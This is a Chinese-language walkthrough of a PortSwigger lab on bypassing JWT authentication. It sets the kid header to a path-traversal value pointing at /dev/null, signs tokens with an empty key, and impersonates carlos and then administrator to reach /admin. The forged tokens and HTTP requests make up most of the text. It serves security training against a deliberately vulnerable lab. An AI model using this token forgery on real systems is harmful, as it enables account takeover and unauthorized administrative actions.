# 实验：通过 kid 头部路径遍历绕过 JWT 身份验证

本实验使用基于 JWT 的机制来处理会话。为了验证签名，服务器使用 JWT 头部中的 `kid` 参数从其文件系统中获取相关密钥。

要解决本实验，请伪造一个 JWT，使您能够访问 `/admin` 下的管理面板，然后删除用户 `carlos`。

您可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
>
> 我们建议在尝试本实验之前，先熟悉[如何在 Burp Suite 中使用 JWT](/burp/documentation/desktop/testing-workflow/vulnerabilities/session-management/jwts)。

## 步骤

探测
- 登陆后，服务器响应
    ```http
    HTTP/2 302 Found
    Location: /my-account?id=wiener
    Set-Cookie: session=eyJraWQiOiI0M2JjODg1My1mZTE0LTQ3OGQtOGM3ZS04NWM2NTI3MTgwNGMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4Njc1NzIxNiwic3ViIjoid2llbmVyIn0.i828w9kDluj6jTvNdmmgiVZkGSuOYVC2L7ikkOwruxw; Secure; HttpOnly; SameSite=None
    ```
    - 使用 JWT 会话令牌

        ```json
        {
            "kid": "43bc8853-fe14-478d-8c7e-85c65271804c",
            "alg": "HS256"
        }
        {
            "iss": "portswigger",
            "exp": 1786757216,
            "sub": "wiener"
        }
        ```

构造已知文件 JWT 签名载荷
- 修改 `kid` 字段进行路径遍历到已知文件
    ```json
    {
        "kid": "../../../../../dev/null",
        "alg": "HS256"
    }
    ```
- 使用空 key 签名
- 尝试访问账户端点
    ```http
    GET /my-account?id=wiener HTTP/2
    session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc4Njc1NzIxNiwic3ViIjoid2llbmVyIn0.A42ttssGECkcFFWTpoTVUlbIzMuMbIaXj9-Ak71T0xs
    ```
    - 成功访问当前用户的账户页面

- 尝试访问 carlos 账户页面
    - 修改用户字段后使用空 key 签名
        ```json
        {
            "iss": "portswigger",
            "exp": 1786757216,
            "sub": "carlos"
        }
        ```
    - 访问账户端点

        ```http
        GET /my-account HTTP/2
        ```
        - 成功

尝试修改用户字段为管理员，签名后访问管理端点
- 载荷
    ```json
    {
        "kid": "../../../../../dev/null",
        "alg": "HS256"
    }
    {
        "iss": "portswigger",
        "exp": 1786757216,
        "sub": "administrator"
    }
    ```
    - 成功访问管理员账户页面

- 复制 JWT 后设置浏览器 cookie，访问 `/admin` 执行删除功能
